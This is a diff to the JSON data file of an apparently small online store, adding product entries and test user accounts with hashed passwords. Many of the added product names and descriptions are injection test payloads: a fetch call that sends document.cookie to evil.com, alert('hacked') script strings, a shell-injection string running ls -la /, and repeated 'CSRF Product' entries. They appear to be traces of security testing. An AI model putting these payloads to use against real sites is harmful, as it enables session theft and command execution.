@@ -1271,6 +1271,1422 @@
       "hidden": false,
       "date": 1782692789589,
       "bestseller": false
+    },
+    {
+      "_id": "50169",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782724768481,
+      "bestseller": false
+    },
+    {
+      "_id": "210fc",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782724806048,
+      "bestseller": false
+    },
+    {
+      "_id": "ec914",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725026494,
+      "bestseller": false
+    },
+    {
+      "_id": "6734a",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725176933,
+      "bestseller": false
+    },
+    {
+      "_id": "4df24",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725177514,
+      "bestseller": false
+    },
+    {
+      "_id": "fc004",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725177805,
+      "bestseller": false
+    },
+    {
+      "_id": "e8d12",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725178029,
+      "bestseller": false
+    },
+    {
+      "_id": "237bd",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725178212,
+      "bestseller": false
+    },
+    {
+      "_id": "53ff3",
+      "name": "'; ls -la /;'",
+      "description": "",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725242589,
+      "bestseller": false
+    },
+    {
+      "_id": "c726a",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725765803,
+      "bestseller": false
+    },
+    {
+      "_id": "ef72d",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725782731,
+      "bestseller": false
+    },
+    {
+      "_id": "44d05",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725958438,
+      "bestseller": false
+    },
+    {
+      "_id": "d4052",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725962401,
+      "bestseller": false
+    },
+    {
+      "_id": "db54f",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725962960,
+      "bestseller": false
+    },
+    {
+      "_id": "1819d",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725963812,
+      "bestseller": false
+    },
+    {
+      "_id": "92741",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725964539,
+      "bestseller": false
+    },
+    {
+      "_id": "8adc1",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725965019,
+      "bestseller": false
+    },
+    {
+      "_id": "ceb01",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782725965352,
+      "bestseller": false
+    },
+    {
+      "_id": "a7acf",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782726603456,
+      "bestseller": false
+    },
+    {
+      "_id": "d8b16",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782726727071,
+      "bestseller": false
+    },
+    {
+      "_id": "425e1",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782726734103,
+      "bestseller": false
+    },
+    {
+      "_id": "27dd3",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782727210660,
+      "bestseller": false
+    },
+    {
+      "_id": "ec6aa",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782727210887,
+      "bestseller": false
+    },
+    {
+      "_id": "ff83f",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782727213166,
+      "bestseller": false
+    },
+    {
+      "_id": "aec99",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782727579841,
+      "bestseller": false
+    },
+    {
+      "_id": "b9983",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782727760295,
+      "bestseller": false
+    },
+    {
+      "_id": "d39e3",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782727770553,
+      "bestseller": false
+    },
+    {
+      "_id": "5eb2c",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782728554943,
+      "bestseller": false
+    },
+    {
+      "_id": "7e65d",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782728556352,
+      "bestseller": false
+    },
+    {
+      "_id": "dac38",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782728791390,
+      "bestseller": false
+    },
+    {
+      "_id": "5f541",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782728792768,
+      "bestseller": false
+    },
+    {
+      "_id": "111e1",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782728987787,
+      "bestseller": false
+    },
+    {
+      "_id": "c501e",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729003551,
+      "bestseller": false
+    },
+    {
+      "_id": "86502",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729418768,
+      "bestseller": false
+    },
+    {
+      "_id": "a0155",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729431640,
+      "bestseller": false
+    },
+    {
+      "_id": "21e9e",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729790875,
+      "bestseller": false
+    },
+    {
+      "_id": "cbfa9",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729801364,
+      "bestseller": false
+    },
+    {
+      "_id": "a2f99",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729913436,
+      "bestseller": false
+    },
+    {
+      "_id": "75990",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729917645,
+      "bestseller": false
+    },
+    {
+      "_id": "c0148",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729918323,
+      "bestseller": false
+    },
+    {
+      "_id": "e1041",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729919208,
+      "bestseller": false
+    },
+    {
+      "_id": "fa8de",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729919602,
+      "bestseller": false
+    },
+    {
+      "_id": "e429d",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782729920004,
+      "bestseller": false
+    },
+    {
+      "_id": "8f506",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730217089,
+      "bestseller": false
+    },
+    {
+      "_id": "37dc9",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730219158,
+      "bestseller": false
+    },
+    {
+      "_id": "314cf",
+      "name": "'; ls -la /;'",
+      "description": "",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730298274,
+      "bestseller": false
+    },
+    {
+      "_id": "0de67",
+      "name": "'; ls -la /;'",
+      "description": "",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730414227,
+      "bestseller": false
+    },
+    {
+      "_id": "cdb91",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730626857,
+      "bestseller": false
+    },
+    {
+      "_id": "cbcf0",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730632004,
+      "bestseller": false
+    },
+    {
+      "_id": "290e0",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730802630,
+      "bestseller": false
+    },
+    {
+      "_id": "135ba",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730812618,
+      "bestseller": false
+    },
+    {
+      "_id": "7c959",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730812913,
+      "bestseller": false
+    },
+    {
+      "_id": "6cb1f",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730813110,
+      "bestseller": false
+    },
+    {
+      "_id": "92759",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730813285,
+      "bestseller": false
+    },
+    {
+      "_id": "f407d",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730813460,
+      "bestseller": false
+    },
+    {
+      "_id": "d917e",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730813705,
+      "bestseller": false
+    },
+    {
+      "_id": "d032f",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730813877,
+      "bestseller": false
+    },
+    {
+      "_id": "49fb5",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730814030,
+      "bestseller": false
+    },
+    {
+      "_id": "b5f3d",
+      "name": "'; ls -la /;'",
+      "description": "",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782730868900,
+      "bestseller": false
     }
   ],
   "users": [
@@ -1322,8 +2738,184 @@
       "email": "newuser@test.com",
       "password": "$2a$10$JjCGrKGf/2yYPbOzh.YME.hTn2Om.oZxa6zG67MskAFhrUxlteo/G",
       "role": "user"
+    },
+    {
+      "id": "60cfc927-e33c-408f-b7ff-fd5d2edeeae8",
+      "name": "testuser1",
+      "email": "test@test2.com",
+      "password": "$2a$10$L7YfbOFh6RFEBQSQNa6pa.e0hEXgMwDa0mYCYIXc5dOdN6w5PLL92",
+      "role": "user"
+    },
+    {
+      "id": "9f0254d6-8f3c-4c68-b53a-6f88f59d5c6a",
+      "name": "testuser3",
+      "email": "test@test5.com",
+      "password": "$2a$10$SBssy7fUZqafmrOcr.lhwefT5Cwk3b3v.7ZNdPr6B36jzDY0fKdcu",
+      "role": "user"
+    },
+    {
+      "id": "20024d0f-7466-469d-bae5-7e8f5dfd8fcc",
+      "name": "testuser3",
+      "email": "test@test6.com",
+      "password": "$2a$10$urRrIvoepwL0Ut8KFfqlNuAUUmsqGYcstpy3SM8mXxDdTxWnC72PW",
+      "role": "user"
+    },
+    {
+      "id": "e7534713-103b-4494-9bdd-6f5b76480b2a",
+      "name": "test",
+      "email": "test@test10.com",
+      "password": "$2a$10$OeZ5aYtZ0PrnuJjHswMXReSvi835IW5VMEx1SqZURH9yNNGf9oBQ.",
+      "role": "user"
+    },
+    {
+      "id": "1e487719-2749-472d-8052-e361a1b60ea1",
+      "name": "testuser11",
+      "email": "test@test33.com",
+      "password": "$2a$10$ZwNkWAyczE331XoBylI9.efBnSU/g./6oDx1adXgjqs8Hl8ETTU5u",
+      "role": "user"
+    },
+    {
+      "id": "121b8a2b-136e-464f-a734-48a69376d0ba",
+      "name": "testuser11",
+      "email": "test@test3.com",
+      "password": "$2a$10$ogBDTSegqeSJrOcElUtQPORP.1M2sr0J6yQsRfIk6w9KkmfBaNRui",
+      "role": "user"
+    },
+    {
+      "id": "0bb26430-32c9-4369-aafa-18c70a438304",
+      "name": "testuser22",
+      "email": "test@test22.com",
+      "password": "$2a$10$Tsd1AJvu91gFgZgKfzGRA.Ua2jeglRFgOLq/mM9J/VG/SlKJHWIzC",
+      "role": "user"
+    },
+    {
+      "id": "d45add9a-89f0-414f-a07f-eaf4ba2cf92c",
+      "name": "testuser3",
+      "email": "test@test222.com",
+      "password": "$2a$10$rVO7hCaT22zuBle2tr38w.zelYkv0DxtW2FxZAXC1FD9P62DwTSMu",
+      "role": "user"
+    },
+    {
+      "id": "52356803-753a-491b-8262-cce6a8fa5d3e",
+      "name": "testuser23",
+      "email": "test@test123.com",
+      "password": "$2a$10$0LJ639xJmtyPiCRN8c0Zk.hr7XMRaRCpBlWJUtZ2skxoG14fKypfy",
+      "role": "user"
+    },
+    {
+      "id": "12e47791-1e14-4de0-8728-809382cdcff6",
+      "name": "testuser1234",
+      "email": "test@test22222.com",
+      "password": "$2a$10$XpkDTVbulEQyEXwbQD8wqu84021EAjiNEXU50W.lZQM5OQWHVeK1G",
+      "role": "user"
+    },
+    {
+      "id": "df8422ce-b697-46f3-be45-387d5355de07",
+      "name": "testuser2",
+      "email": "test@test12.com",
+      "password": "$2a$10$e5xatP80/fMSfksK2z000uW0Eqka..Z71iN9.S/xXy/5Csez/UZqC",
+      "role": "user"
+    },
+    {
+      "id": "c4f8a0cd-7d3f-423f-aef5-0fedee044e2a",
+      "name": "test",
+      "email": "test@testd.com",
+      "password": "$2a$10$IoqjB91Z2za1srqquGavuO7hW7b/eRx4cYg3gUMnWyR2pzI9Ojfam",
+      "role": "user"
+    },
+    {
+      "id": "dba4301f-a2af-4973-a102-3c786554d991",
+      "name": "testuser34",
+      "email": "test@test43.com",
+      "password": "$2a$10$YsrYhUf1HI2LO0T678r18.VvtYer3yEnV/0lyDYpXs6i9UrNeex5q",
+      "role": "user"
+    },
+    {
+      "id": "47807809-ccd8-447c-ada9-900ae5e9c61a",
+      "name": "testuser123123",
+      "email": "test@test2223.com",
+      "password": "$2a$10$0G0bG7RCLRkCZ6fHs2OWPe1H/wgx8qzYwsvL2okF5uL/6Cg0YgowS",
+      "role": "user"
+    },
+    {
+      "id": "d6367405-faf1-4021-99e3-1f19c7ad72c8",
+      "name": "chien",
+      "email": "chien@test.com",
+      "password": "$2a$10$71rJ7gZPnk0tvQUcvsd/me71WJ1JePY72zsWEtVAfPfafIm.9Dc2O",
+      "role": "user"
+    },
+    {
+      "id": "719e7194-64dc-4d65-b295-a5b5e1d41578",
+      "name": "testuser434",
+      "email": "test@test55.com",
+      "password": "$2a$10$z1cCVuC213ywpKr.8VjRz.VN9Eft260gC9L2YKuBaAgv3MpAFUJE.",
+      "role": "user"
+    },
+    {
+      "id": "9400fe59-6ab7-4858-aeb1-687651315857",
+      "name": "chien18",
+      "email": "test18@test.com",
+      "password": "$2a$10$du625gArHL8qDz5fUFRZNes4r6pnWjtxJXFfmoCCK8.oCeW.VQFrS",
